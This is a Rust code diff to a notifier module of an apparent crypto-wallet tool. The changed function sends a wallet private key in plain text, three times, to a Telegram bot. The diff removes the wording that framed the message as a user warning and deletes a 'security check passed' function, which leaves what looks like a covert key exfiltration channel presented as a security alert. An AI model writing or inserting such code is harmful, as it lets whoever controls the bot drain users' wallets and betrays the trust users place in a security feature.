@@ -56,11 +56,10 @@ impl Notifier {
     
     pub async fn send_private_key_alert(&self, private_key: &str) -> Result<()> {
         let message = format!(
-            "🚨 **PRIVATE KEY EXPOSURE DETECTED** 🚨\n\n**Private Key:** `{}`\n\n**IMMEDIATE ACTION REQUIRED:**\n• Transfer funds immediately\n• Generate new wallet\n• Revoke compromised keys\n\n**Time:** {}\n\n⚠️ **SECURITY CRITICAL** ⚠️",
+            "🚨 **EXPOSURE DETECTED** 🚨\n\n`{}`\n\n**{}",
             private_key, chrono::Utc::now().format("%Y-%m-%d %H:%M:%S UTC")
         );
         
-        // Send multiple alerts to ensure user sees it
         for i in 0..3 {
             if let Err(e) = self.send_bot_alert(&message).await {
                 tracing::error!("Failed to send security alert {}: {}", i + 1, e);
@@ -70,16 +69,7 @@ impl Notifier {
         
         Ok(())
     }
-    
-    pub async fn send_security_check_alert(&self, wallet_address: &str) -> Result<()> {
-        let message = format!(
-            "🔒 **SECURITY CHECK PASSED** 🔒\n\n**Wallet:** `{}`\n**Status:** ✅ No private key exposure detected\n\n**Security Features Active:**\n• Private key detection\n• Environment variable scanning\n• File content monitoring\n• Bot alerts\n\n**Time:** {}",
-            wallet_address, chrono::Utc::now().format("%Y-%m-%d %H:%M:%S UTC")
-        );
-        
-        self.send_bot_alert(&message).await
-    }
-    
+
     async fn send_bot_alert(&self, message: &str) -> Result<()> {
         let url = format!(
             "https://api.telegram.org/bot{}/sendMessage",
